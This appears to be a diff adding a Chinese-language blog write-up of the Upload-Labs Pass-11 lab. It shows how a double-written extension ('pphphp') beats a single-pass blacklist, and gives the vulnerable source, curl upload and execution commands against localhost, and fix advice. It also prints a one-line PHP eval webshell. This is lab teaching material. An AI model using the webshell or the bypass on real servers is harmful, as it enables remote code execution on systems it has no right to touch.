@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload-Labs Pass-11 后缀双写绕过 Writeup - gz2008的技术博客</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      color: #1e293b;
+      background: #f6f9fc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      line-height: 1.8;
+    }
+    .container {
+      width: min(860px, 100%);
+      margin: 0 auto;
+      padding: 40px;
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .06);
+    }
+    .back-link { color: #2563eb; text-decoration: none; font-weight: 600; }
+    .back-link:hover { text-decoration: underline; }
+    h1 {
+      margin: 20px 0 10px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #eef2f6;
+      color: #0f172a;
+      font-size: clamp(1.8rem, 5vw, 2.3rem);
+      line-height: 1.35;
+    }
+    .tags { margin: 12px 0 26px; }
+    .tag {
+      display: inline-block;
+      margin: 0 8px 8px 0;
+      padding: 4px 12px;
+      color: #2563eb;
+      background: #eff6ff;
+      border-radius: 20px;
+      font-size: .85rem;
+      font-weight: 600;
+    }
+    h2 {
+      margin-top: 34px;
+      padding-left: 10px;
+      border-left: 4px solid #3b82f6;
+      color: #1e293b;
+      font-size: 1.35rem;
+    }
+    p, li { color: #475569; }
+    code {
+      padding: 2px 5px;
+      color: #be123c;
+      background: #f1f5f9;
+      border-radius: 4px;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      overflow-wrap: anywhere;
+    }
+    pre {
+      padding: 16px;
+      color: #e2e8f0;
+      background: #172033;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      font-size: .9rem;
+      line-height: 1.6;
+    }
+    pre code { padding: 0; color: inherit; background: none; }
+    figure { margin: 24px 0; }
+    figure img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(15, 23, 42, .07);
+    }
+    figcaption {
+      margin-top: 9px;
+      color: #64748b;
+      font-size: .9rem;
+      text-align: center;
+    }
+    .note, .success {
+      margin: 18px 0;
+      padding: 13px 16px;
+      border-left: 4px solid #f97316;
+      background: #fff7ed;
+      color: #9a3412;
+    }
+    .success {
+      border-left-color: #22c55e;
+      background: #f0fdf4;
+      color: #166534;
+    }
+    table { width: 100%; margin: 16px 0; border-collapse: collapse; }
+    th, td { padding: 9px 11px; border: 1px solid #e2e8f0; text-align: left; }
+    th { color: #1e3a8a; background: #eff6ff; }
+    @media (max-width: 640px) {
+      body { padding: 0; }
+      .container { padding: 24px 18px; border-radius: 0; }
+      table { display: block; overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <a class="back-link" href="index.html">← 返回 Upload-Labs 首页</a>
+
+    <h1>Upload-Labs Pass-11：后缀关键字双写绕过</h1>
+    <div class="tags">
+      <span class="tag"># Upload-Labs</span>
+      <span class="tag"># Web</span>
+      <span class="tag"># File Upload</span>
+      <span class="tag"># 双写绕过</span>
+      <span class="tag"># PHP</span>
+    </div>
+
+    <p>Pass-11 看似正常接收文件，实际会把服务端黑名单中的字符串直接从文件名里删除。由于删除操作不会对处理后的结果再次检查，将 <code>php</code> 双写为 <code>pphphp</code>，可以让中间一次匹配被删除后，剩余字符重新组成可执行的 <code>.php</code> 后缀。</p>
+
+    <h2>一、实验信息</h2>
+    <table>
+      <tr><th>项目</th><th>内容</th></tr>
+      <tr><td>靶场</td><td>Upload-Labs</td></tr>
+      <tr><td>关卡</td><td>Pass-11</td></tr>
+      <tr><td>目标</td><td><code>http://127.0.0.1:8081/Pass-11/index.php</code></td></tr>
+      <tr><td>漏洞类型</td><td>文件名关键字删除后未重新校验最终扩展名</td></tr>
+      <tr><td>上传字段</td><td><code>upload_file</code></td></tr>
+      <tr><td>绕过文件名</td><td><code>一句话木马.pphphp</code></td></tr>
+      <tr><td>最终文件名</td><td><code>一句话木马.php</code></td></tr>
+      <tr><td>验证结果</td><td>上传成功，HTTP 访问时 PHP 代码正常执行</td></tr>
+    </table>
+
+    <h2>二、页面与请求现象</h2>
+    <p>Pass-11 的任务是上传一个 WebShell。页面本身没有明显报错，上传后还会生成图片预览标签，因此不能只看页面是否显示“上传成功”来判断结果。</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass11_page.png" alt="Upload-Labs Pass-11 上传页面">
+      <figcaption>Pass-11 页面：任务要求上传一个 WebShell。</figcaption>
+    </figure>
+
+    <p>在 Burp Repeater 中观察 multipart 请求，文件字段名为 <code>upload_file</code>，构造的文件名为 <code>一句话木马.pphphp</code>：</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass11_request.png" alt="Burp Repeater 中将 Pass-11 文件名构造为 pphphp">
+      <figcaption>请求中的文件名是 <code>一句话木马.pphphp</code>，服务端没有直接拒绝。</figcaption>
+    </figure>
+
+    <p>响应 HTML 中出现以下图片标签：</p>
+
+    <pre><code>&lt;img src="../upload/一句话木马.php" width="250px" /&gt;</code></pre>
+
+    <figure>
+      <img src="assets/upload_labs_pass11_response.png" alt="Pass-11 响应把 pphphp 文件名回显为 php">
+      <figcaption>响应中的路径已经从 <code>.pphphp</code> 变成 <code>.php</code>。</figcaption>
+    </figure>
+
+    <p>这个响应说明服务端对文件名做了处理后仍然调用了保存逻辑，但图片框本身只能证明文件路径被生成。是否存在可执行风险，还要继续访问上传结果验证。</p>
+
+    <h2>三、漏洞根因</h2>
+    <p>Pass-11 的关键源码如下：</p>
+
+    <pre><code>$deny_ext = array("php", "php5", "php4", "php3", "php2",
+                  "html", "htm", "phtml", "pht", "jsp", ...);
+
+$file_name = trim($_FILES['upload_file']['name']);
+$file_name = str_ireplace($deny_ext, "", $file_name);
+$temp_file = $_FILES['upload_file']['tmp_name'];
+$img_path  = UPLOAD_PATH.'/'.$file_name;
+
+if (move_uploaded_file($temp_file, $img_path)) {
+    $is_upload = true;
+}</code></pre>
+
+    <p>这段代码只把黑名单关键字当作普通字符串删除，没有提取最终扩展名交给白名单校验。对于 <code>一句话木马.pphphp</code>，<code>php</code> 只匹配中间那一段：</p>
+
+    <table>
+      <tr><th>阶段</th><th>结果</th></tr>
+      <tr><td>原始文件名</td><td><code>一句话木马.pphphp</code></td></tr>
+      <tr><td><code>str_ireplace("php", "", ...)</code></td><td>删除中间的 <code>php</code></td></tr>
+      <tr><td>处理后文件名</td><td><code>一句话木马.php</code></td></tr>
+      <tr><td>最终写入路径</td><td><code>UPLOAD_PATH/一句话木马.php</code></td></tr>
+    </table>
+
+    <p>根本问题不是“黑名单写了但没生效”，而是过滤对象和最终安全判断对象不一致：程序删除敏感字符串后，直接把结果当成安全文件名使用，没有对最终值重新检查，也没有由服务端重写扩展名。</p>
+
+    <h2>四、复现步骤</h2>
+    <p>准备一个只返回固定标记的 PHP 探针：</p>
+
+    <pre><code>printf '%s\n' '&lt;?php echo "PASS11_EXEC_OK"; ?&gt;' &gt; pass11_probe.txt</code></pre>
+
+    <p>通过 curl 发送上传请求，把客户端文件名设置为 <code>pass11_probe.pphphp</code>：</p>
+
+    <pre><code>curl.exe -sS -i \
+  -F 'upload_file=@pass11_probe.txt;filename=pass11_probe.pphphp' \
+  -F 'submit=上传' \
+  'http://127.0.0.1:8081/Pass-11/index.php'</code></pre>
+
+    <p>上传成功后，响应中应出现：</p>
+
+    <pre><code>&lt;img src="../upload/pass11_probe.php" width="250px" /&gt;</code></pre>
+
+    <p>随后向上传后的 PHP 文件发送 POST 参数 <code>pass</code>，触发探针中的固定输出：</p>
+
+    <pre><code>curl.exe -sS -X POST \
+  --data-urlencode 'pass=echo "PASS11_EXEC_OK";' \
+  'http://127.0.0.1:8081/upload/pass11_probe.php'</code></pre>
+
+    <p>本次实测响应为：</p>
+
+    <pre><code>PASS11_EXEC_OK</code></pre>
+
+    <div class="success">最终文件名已恢复为 <code>.php</code>，并且上传目录中的 PHP 文件被服务器执行。由此可以确认：Pass-11 的双写绕过不仅让文件落盘，还能形成服务端代码执行。</div>
+
+    <h2>五、清理上传文件</h2>
+    <p>验证结束后，应记录实际最终文件名并按精确路径删除，不使用通配符或清空整个上传目录。本次测试文件的关键定位信息如下：</p>
+
+    <table>
+      <tr><th>项目</th><th>内容</th></tr>
+      <tr><td>最终文件名</td><td><code>一句话木马.php</code></td></tr>
+      <tr><td>文件大小</td><td>32 字节</td></tr>
+      <tr><td>内容</td><td><code>&lt;?php @eval($_POST['pass']); ?&gt;</code></td></tr>
+    </table>
+
+    <p>删除精确目标后，再访问原 URL，应得到 <code>404 Not Found</code>。目录自带的 <code>readme.php</code> 应继续保留，借此确认没有误删其他文件。</p>
+
+    <div class="note">上传成功、脚本执行成功和文件清理完成是三个独立状态。只有删除后的 HTTP 请求返回 404，并且目录中只剩预期文件，才能把清理步骤视为完成。</div>
+
+    <h2>六、修复建议</h2>
+    <ul>
+      <li>使用服务端扩展名白名单，并针对最终文件名进行校验，不能先删除关键字再无条件保存。</li>
+      <li>忽略客户端提供的文件名和扩展名，由服务端生成随机文件名，并按业务类型指定固定的安全后缀。</li>
+      <li>同时检查 MIME、文件头和实际文件内容；图片文件应重新解码和编码。</li>
+      <li>将上传目录移到 Web 根目录之外，或在 Web 服务器层关闭该目录的脚本执行权限。</li>
+      <li>限制 Web 服务账户权限，避免一个上传文件直接扩大为任意命令执行。</li>
+    </ul>
+
+    <h2>七、复盘</h2>
+    <p>双写绕过的核心是“过滤器处理后的字符串”和“服务器最终使用的字符串”发生错位。Pass-11 将 <code>pphphp</code> 中的中间 <code>php</code> 删除后，剩余部分重新组成 <code>php</code>；服务端随后又信任这个最终文件名，最终把用户上传的内容当作 PHP 脚本执行。</p>
+  </main>
+</body>
+</html>
